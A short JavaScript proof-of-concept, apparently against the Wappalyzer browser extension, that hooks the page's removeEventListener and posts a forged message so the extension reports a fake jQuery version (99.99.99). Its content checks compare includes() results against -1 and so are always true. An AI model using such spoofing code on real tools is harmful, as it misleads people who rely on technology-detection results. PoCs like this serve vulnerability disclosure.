// hook removeEventListener
let rel = removeEventListener;
removeEventListener = (name, func, opt) => {
  if (
    name === "message" &&
    func &&
    func.toString().includes("wappalyzer.technologies") !== -1 &&
    func.toString().includes("removeEventListener") !== -1 &&
    func.toString().includes("__UNDEFINED__") !== -1 &&
    func.toString().includes("postMessage") !== -1
  ) {
    poc();
    rel(name, func, opt);
  } else {
    rel(name, func, opt);
  }
};

const poc = () => {
  postMessage({
    wappalyzer: {
      js: [
        {
          name: "jQuery",
          chain: "$.fn.jquery",
          value: "99.99.99",
        },
      ],
    },
  });
};
